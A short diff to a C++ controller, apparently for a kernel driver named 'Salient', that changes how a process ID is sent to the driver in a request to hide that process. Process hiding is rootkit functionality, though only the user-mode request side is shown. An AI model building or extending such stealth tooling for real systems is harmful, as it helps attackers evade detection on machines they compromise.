@@ -32,11 +32,9 @@ bool KMDHandler::pingDriver()
 bool KMDHandler::hideProcess(int pID)
 {
 	char outBuffer[128] = { 0 };
-	char inBuffer[128] = { 0 };
-	sprintf_s(inBuffer, "%u", pID);
 	DWORD dwBytesRead = 0;
 	printf("\n[*] Asking Salient to hide PID %u\n", pID);
-	DeviceIoControl(this->hDriver, IOCTL_PHIDE_CMD, inBuffer, strlen(inBuffer), outBuffer, sizeof(outBuffer), &dwBytesRead, NULL);
+	DeviceIoControl(this->hDriver, IOCTL_PHIDE_CMD, &pID, sizeof(int), outBuffer, sizeof(outBuffer), &dwBytesRead, NULL);
 	printf("[*] Driver: %s\n", outBuffer);
 	return true;
 
